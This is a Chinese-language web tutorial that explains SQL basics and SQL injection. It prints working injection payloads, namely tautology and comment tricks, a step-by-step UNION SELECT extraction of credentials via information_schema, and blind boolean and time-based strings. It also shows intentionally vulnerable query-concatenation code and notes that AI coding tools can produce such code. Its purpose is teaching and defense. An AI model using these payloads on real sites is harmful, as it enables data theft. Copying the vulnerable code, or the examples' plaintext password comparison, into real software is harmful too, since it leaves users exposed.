📚 SQL 是什麼？

SQL (Structured Query Language，結構化查詢語言) 是用來管理關聯式資料庫的標準語言。就像你跟資料庫「溝通」的語言一樣。

🔹 常用的 SQL 語法

1️⃣ SELECT - 查詢資料

-- 查詢所有使用者 SELECT * FROM users; -- 查詢特定欄位 SELECT username, email FROM users; -- 條件查詢 SELECT * FROM users WHERE username = 'admin';

2️⃣ INSERT - 新增資料

-- 新增一筆使用者資料 INSERT INTO users (username, password, email) VALUES ('john', 'pass123', 'john@example.com');

3️⃣ UPDATE - 更新資料

-- 更新使用者密碼 UPDATE users SET password = 'newpass' WHERE username = 'john';

4️⃣ DELETE - 刪除資料

-- 刪除特定使用者 DELETE FROM users WHERE username = 'john';

🔹 進階語法

-- UNION：合併多個查詢結果 SELECT username FROM users UNION SELECT email FROM customers; -- ORDER BY：排序結果 SELECT * FROM products ORDER BY price DESC; -- LIMIT：限制結果數量 SELECT * FROM users LIMIT 10;

⚠️ SQL Injection 發生成因

⚠️ 什麼是 SQL Injection？
SQL 注入是一種網路攻擊手法，攻擊者透過輸入惡意的 SQL 程式碼，讓系統執行非預期的資料庫操作，可能導致資料外洩、被竄改、甚至整個系統被控制。

🔹 漏洞成因

當程式直接把使用者的輸入「拼接」到 SQL 查詢中，而沒有做任何檢查或處理時，就會產生漏洞。

❌ 有漏洞的程式碼（PHP）

// 直接把使用者輸入放進 SQL $username = $_POST['username']; $password = $_POST['password']; $sql = "SELECT * FROM users WHERE username='$username' AND password='$password'"; $result = mysqli_query($conn, $sql);

✅ 安全的程式碼（PHP）

// 使用 Prepared Statement $username = $_POST['username']; $password = $_POST['password']; $stmt = $conn->prepare( "SELECT * FROM users WHERE username=? AND password=?" ); $stmt->bind_param("ss", $username, $password);

🔹 常見的注入手法

  1. 註解符號攻擊：使用 -- 或 # 註解掉後面的 SQL
  2. 永真條件：使用 ' OR '1'='1 讓條件永遠成立
  3. 堆疊查詢：使用 ; 分號執行多個 SQL 語句
  4. UNION 查詢：使用 UNION 合併惡意查詢
-- 註解符號攻擊範例 輸入：admin'-- 產生的 SQL：SELECT * FROM users WHERE username='admin'--' AND password='xxx' -- 永真條件範例 輸入：' OR '1'='1 產生的 SQL：SELECT * FROM users WHERE username='' OR '1'='1' AND password='xxx'

🔗 UNION SELECT SQL Injection

📖 什麼是 UNION SELECT 注入？
UNION SELECT 是一種進階的 SQL 注入技術，攻擊者利用 UNION 關鍵字來合併兩個查詢的結果，藉此讀取資料庫中的敏感資料。

🔹 UNION 的基本概念

UNION 可以合併兩個 SELECT 查詢的結果，但有兩個重要條件：

  • 兩個查詢的欄位數量必須相同
  • 對應欄位的資料型態要相容
-- 正常的 UNION 使用 SELECT name, age FROM students UNION SELECT name, age FROM teachers;

🔹 攻擊步驟

步驟 1
判斷欄位數量
步驟 2
找出顯示位置
步驟 3
取得資料庫資訊
步驟 4
竊取敏感資料

步驟 1：判斷欄位數量

使用 ORDER BY 或 UNION SELECT NULL 來測試欄位數量

-- 方法 1：使用 ORDER BY ' ORDER BY 1-- ← 沒錯誤 ' ORDER BY 2-- ← 沒錯誤 ' ORDER BY 3-- ← 沒錯誤 ' ORDER BY 4-- ← 出現錯誤！表示有 3 個欄位 -- 方法 2：使用 UNION SELECT NULL ' UNION SELECT NULL-- ← 錯誤 ' UNION SELECT NULL,NULL-- ← 錯誤 ' UNION SELECT NULL,NULL,NULL-- ← 成功！

步驟 2：找出顯示位置

使用不同的值來確定哪些欄位會顯示在網頁上

-- 使用數字或字串來標記每個欄位 ' UNION SELECT 1,2,3-- ' UNION SELECT 'A','B','C'-- -- 如果看到網頁顯示 "2" 和 "3"，表示第 2、3 欄位會顯示

步驟 3：取得資料庫資訊

利用資料庫的系統資料表來取得結構資訊

-- MySQL：查詢資料庫名稱 ' UNION SELECT DATABASE(),USER(),VERSION()-- -- MySQL：查詢所有資料表 ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -- MySQL：查詢特定資料表的欄位 ' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

步驟 4：竊取敏感資料

現在我們知道資料表結構了，可以直接讀取資料

-- 讀取 users 資料表的所有資料 ' UNION SELECT username,password,email FROM users-- -- 合併多個欄位 ' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--
🛡️ 防禦方法：
  • 使用 Prepared Statements（參數化查詢）
  • 輸入驗證：檢查資料格式和長度
  • 最小權限原則：資料庫帳號只給必要的權限
  • 關閉錯誤訊息：不要在正式環境顯示詳細錯誤
  • 使用 WAF（Web Application Firewall）

🕵️ 盲注（Blind SQL Injection）

📖 什麼是盲注？
當網站不會直接顯示 SQL 查詢結果或錯誤訊息時，攻擊者只能透過「真/假」的反應或「時間延遲」來逐步推測資料庫內容，這就是盲注攻擊。

🔹 盲注的類型

1️⃣ Boolean-based 布林盲注

根據網頁回應的不同內容來判斷條件的真假

-- 測試是否為 admin ' AND username='admin'-- -- 逐字猜測密碼 ' AND SUBSTRING(password,1,1)='a'-- ' AND SUBSTRING(password,1,1)='b'-- -- 持續測試直到找到正確字元

2️⃣ Time-based 時間盲注

利用延遲函數，根據回應時間來判斷

-- MySQL 的延遲函數 ' AND IF(1=1, SLEEP(5), 0)-- -- 猜測第一個字元 ' AND IF( SUBSTRING(password,1,1)='a', SLEEP(5), 0 )--

🔹 盲注攻擊流程

  1. 確認漏洞存在：測試基本的 SQL 語法是否有反應
  2. 確定注入點類型：判斷是 Boolean-based 還是 Time-based
  3. 逐步猜測：
    • 先猜測字串長度：LENGTH(password)=5
    • 再逐字猜測內容：SUBSTRING(password,1,1)='a'
  4. 自動化攻擊：使用工具（如 SQLMap）自動化整個過程
🛡️ 盲注防禦策略：
  • 統一回應訊息：不管成功或失敗都顯示相同訊息
  • 限制查詢時間：設定 SQL 查詢的最長執行時間
  • 使用 Prepared Statements：這是最根本的防護
  • 輸入驗證：嚴格檢查使用者輸入的格式
  • WAF 規則：偵測異常的查詢模式
  • 監控異常：記錄並警示異常的查詢行為

🤖 AI 時代如何避免 SQL Injection

⚠️ 重要提醒
當你使用 AI（如 ChatGPT、Claude、Copilot）來產生程式碼時，AI 可能會生成有漏洞的程式碼。你必須知道如何檢查和修正！

🔹 AI 可能產生的有漏洞程式碼

❌ AI 常見的錯誤範例

// AI 可能直接拼接字串 const username = req.body.username; const query = `SELECT * FROM users WHERE username='${username}'`; // PHP 版本 $sql = "SELECT * FROM users WHERE id=" . $_GET['id']; // Python 版本 query = f"SELECT * FROM users WHERE email='{email}'"

✅ 要求 AI 使用安全的方法

// Node.js with prepared statement const query = 'SELECT * FROM users WHERE username = ?'; db.execute(query, [username]); // PHP PDO $stmt = $pdo->prepare( "SELECT * FROM users WHERE id = :id" ); $stmt->execute(['id' => $id]); // Python with parameterized query cursor.execute( "SELECT * FROM users WHERE email = %s", (email,) )

🔹 與 AI 對話的最佳實踐

✨ 好的提示詞（Prompt）範例

👍 這樣問 AI：

「請幫我寫一個 PHP 登入功能，必須使用 PDO 的 prepared statements 來防止 SQL injection，不要使用字串拼接的方式。」

👍 或是這樣：

「請檢查這段程式碼是否有 SQL injection 漏洞，如果有請幫我用安全的方式改寫：[貼上你的程式碼]」

👎 不好的問法：

「寫一個登入功能」（太簡略，AI 可能會用不安全的方式）

🔹 各語言的安全範例

PHP - 使用 PDO Prepared Statements

// ✅ 安全的 PDO 寫法 try { $pdo = new PDO('mysql:host=localhost;dbname=mydb', 'user', 'pass'); $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // 準備語句 $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password"); // 綁定參數 $stmt->bindParam(':username', $username); $stmt->bindParam(':password', $password); // 執行查詢 $stmt->execute(); $user = $stmt->fetch(); } catch (PDOException $e) { // 記錄錯誤，但不顯示給使用者 error_log($e->getMessage()); die('系統發生錯誤，請稍後再試'); }

Node.js - 使用參數化查詢

// ✅ 使用 mysql2 的 prepared statements const mysql = require('mysql2/promise'); async function login(username, password) { const connection = await mysql.createConnection({ host: 'localhost', user: 'dbuser', password: 'dbpass', database: 'mydb' }); // 使用 ? 作為佔位符 const [rows] = await connection.execute( 'SELECT * FROM users WHERE username = ? AND password = ?', [username, password] ); return rows; }

Python - 使用參數化查詢

# ✅ 使用 pymysql 的參數化查詢 import pymysql def login(username, password): connection = pymysql.connect( host='localhost', user='dbuser', password='dbpass', database='mydb' ) try: with connection.cursor() as cursor: # 使用 %s 作為佔位符（不要用 %格式化） sql = "SELECT * FROM users WHERE username=%s AND password=%s" cursor.execute(sql, (username, password)) result = cursor.fetchone() return result finally: connection.close()

🔹 給開發者的建議

🎯 使用 AI 輔助開發時的最佳實踐：
  1. 明確要求安全性：在 prompt 中特別要求使用安全的方法
  2. 要求程式碼審查：請 AI 檢查現有程式碼的安全性
  3. 學習安全知識：了解基本的安全概念，能夠識別問題
  4. 查看官方文件：驗證 AI 建議的方法是否正確
  5. 使用安全工具：搭配 SAST（靜態程式碼分析）工具
  6. 程式碼審查：不要完全信任 AI，要人工檢查
  7. 定期更新：保持框架和函式庫的最新版本
